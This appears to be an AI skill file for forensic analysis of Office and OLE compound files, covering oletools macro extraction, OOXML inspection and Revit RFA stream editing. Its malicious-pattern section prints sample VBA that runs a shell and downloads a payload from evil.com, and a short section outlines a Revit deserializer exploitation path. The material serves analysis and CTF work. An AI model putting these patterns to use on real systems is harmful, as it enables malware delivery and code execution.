---
name: office-forensics
description: Analyze Office documents (DOC, XLS, PPT, DOCX, XLSX, PPTX) and OLE compound files for forensics and CTF challenges. Use this skill whenever the user needs to extract macros, inspect Office file structures, analyze OLE compound files, or investigate potential malware in Office documents. Also use for Revit RFA file analysis and OLE stream manipulation.
---

# Office File Forensics

A skill for analyzing Microsoft Office documents and OLE compound files in forensic and CTF contexts.

## When to use this skill

Use this skill when:
- The user needs to analyze Office documents (DOC, XLS, PPT, DOCX, XLSX, PPTX) for hidden content or macros
- The user is investigating potential malware or phishing in Office files
- The user needs to extract and analyze VBA macros from documents
- The user is working with OLE compound files (CFBF format)
- The user needs to analyze Revit RFA files or other OLE-based formats
- The user is doing CTF forensics challenges involving Office files

## Quick Start

### Install required tools

```bash
# Install oletools for macro extraction and analysis
sudo pip3 install -U oletools

# Install CompoundFileTool for OLE manipulation (if available)
# See: https://github.com/thezdi/CompoundFileTool
```

### Basic macro extraction

```bash
# Extract and classify macros from any Office document
olevba -c /path/to/document.docx

# Full analysis with all options
olevba -v /path/to/document.docx
```

## Office File Formats

### OLE Formats (Legacy)
- **DOC, XLS, PPT** - Binary OLE Compound File format
- **RTF** - Rich Text Format (can contain OLE objects)
- These are single binary files with embedded streams

### OOXML Formats (Modern)
- **DOCX, XLSX, PPTX** - Office Open XML (zip containers)
- Can be inspected by unzipping: `unzip document.docx -d output/`
- Reveals XML structure and file hierarchy

## Macro Analysis

### Automatic Execution Triggers

Macros can auto-execute via these function names:
- `AutoOpen` - Opens when document is opened
- `AutoExec` - Runs automatically
- `Document_Open` - Document open event
- `Workbook_Open` - Excel workbook open event

### Analysis Workflow

1. **Extract macros** using oletools
2. **Review for suspicious patterns**:
   - Shell object creation
   - Process execution commands
   - Network connections
   - File system manipulation
3. **Debug in LibreOffice** (if needed):
   - Open document in LibreOffice
   - Enable macro debugging
   - Set breakpoints and watch variables

### Common Malicious Patterns

```vba
' Shell execution
CreateObject("WScript.Shell").Run "malware.exe"

' Download and execute
Set obj = CreateObject("MSXML2.XMLHTTP")
obj.Open "GET", "http://evil.com/payload", False
obj.Send
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CreateTextFile("C:\temp\payload.exe").Write obj.Response

' Registry manipulation
CreateObject("WScript.Shell").RegWrite ...
```

## OLE Compound File Analysis

### Structure

OLE Compound Files (CFBF) contain:
- **Storages** - Folders/containers
- **Streams** - Files/data
- **Properties** - Metadata

### Expand OLE Files

```bash
# Expand OLE compound file to folder tree
CompoundFileTool /e file.rfa /o output_folder

# Structure becomes:
# output_folder/
#   ├── Storage1/
#   │   └── Stream1
#   └── Stream2
```

### Rebuild OLE Files

```bash
# Repack folder tree back to OLE file
CompoundFileTool /c output_folder /o output.rfa
```

## Revit RFA File Analysis

### File Structure

Revit RFA files are OLE Compound Files with:
- **Storage**: `Global`
- **Stream**: `Latest` → Path: `Global/Latest`

### Stream Layout

```
Global/Latest stream:
├── Header (fixed size)
├── GZIP-compressed payload (serialized object graph)
├── Zero padding
└── ECC trailer (Error-Correcting Code)
```

### Modification Workflow

**Important**: Revit auto-repairs streams using ECC. To persist changes:

1. **Expand the file**
   ```bash
   CompoundFileTool /e model.rfa /o rfa_out
   ```

2. **Edit Global/Latest with care**:
   - Keep the header intact
   - Gunzip the payload
   - Modify bytes as needed
   - Re-gzip with Revit-compatible deflate parameters
   - Preserve zero-padding
   - Recompute ECC trailer

3. **Rebuild the file**
   ```bash
   CompoundFileTool /c rfa_out /o model_patched.rfa
   ```

### Exploitation Considerations

For CTF/exploitation contexts:

- The Revit deserializer reads 16-bit class indices
- Certain types (like `AString`, index `0x1F`) can be abused
- Destructor handling can yield type confusion
- Multiple objects can create a "weird machine" for gadget execution
- Stack pivot into conventional ROP chain

## Tools Reference

### oletools

| Tool | Purpose |
|------|--------|
| `olevba` | Extract and analyze VBA macros |
| `oleid` | Identify OLE document types |
| `oleobj` | Extract embedded OLE objects |
| `oleread` | Read OLE document properties |

### CompoundFileTool

- **Expand**: `CompoundFileTool /e input.rfa /o output_dir`
- **Create**: `CompoundFileTool /c input_dir /o output.rfa`
- **List**: `CompoundFileTool /l input.rfa`

### Other Tools

- **OfficeDissector** - Comprehensive Office document analysis
- **LibreOffice** - Macro debugging with breakpoints
- **IDA Pro + WinDBG** - Reverse engineering and taint tracking
- **Fiddler** - Proxy for supply-chain testing

## Common Tasks

### Task 1: Quick Macro Check

```bash
# Fast classification
olevba -c suspicious.docx

# Look for:
# - Suspicious: High risk macros
# - Suspicious2: Medium risk macros
# - Clean: No macros or safe macros
```

### Task 2: Full Document Analysis

```bash
# Extract all macros
olevba -v document.docx > macros.txt

# Check document type
oleid document.docx

# Extract embedded objects
oleobj -t all document.docx
```

### Task 3: OOXML Structure Inspection

```bash
# Unzip to see structure
unzip document.docx -d docx_contents/

# Key files to check:
# - word/document.xml (main content)
# - word/settings.xml (document settings)
# - word/vbaProject.bin (VBA macros if present)
# - _rels/.rels (relationships)
```

### Task 4: OLE Stream Extraction

```bash
# List all streams
CompoundFileTool /l file.rfa

# Extract specific stream
CompoundFileTool /e file.rfa /o extracted/
# Then navigate to: extracted/Storage/Stream
```

## Safety Notes

- **Never** run macros from untrusted sources
- Use sandboxed environments for analysis
- Disable macro execution in Office applications
- Scan extracted files with antivirus
- Work in isolated VMs for suspicious files

## References

- [Trail of Bits CTF Forensics](https://trailofbits.github.io/ctf/forensics/)
- [oletools GitHub](https://github.com/decalage2/oletools)
- [CompoundFileTool GitHub](https://github.com/thezdi/CompoundFileTool)
- [OLE Compound File Documentation](https://learn.microsoft.com/en-us/windows/win32/stg/istorage-compound-file-implementation)
- [ZDI Revit RFA Exploit Analysis](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)
